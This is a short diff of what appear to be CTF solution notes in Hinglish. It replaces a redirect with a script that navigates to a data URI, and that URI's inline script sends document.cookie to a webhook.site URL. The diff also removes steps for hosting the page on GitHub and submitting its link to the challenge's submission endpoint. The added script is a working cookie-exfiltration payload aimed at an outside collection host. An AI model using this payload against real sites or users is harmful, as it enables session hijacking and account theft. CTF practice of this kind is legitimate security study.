@@ -2,18 +2,11 @@
 <html>
 <body>
 <script>
-window.location = 'http://151.115.166.43:18920/drawing/1c5cacb7d607acf2';
+var w = 'https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8';
+
+// Method 1: data URI - CORS nahi hota
+document.location = 'data:text/html,<script>fetch("https://webhook.site/3ebc554f-f359-45f5-9b7f-d60cd8539ca8?c="+document.cookie)<\/script>';
 </script>
 </body>
 </html>
 ```
-
-### Step 2 — GitHub pe commit karo
-
-### Step 3 — CTF mein submit karo
-```
-http://151.115.166.43:18920/link-submission
-```
-Submit:
-```
-https://viveksharma-cs.github.io/ctf/
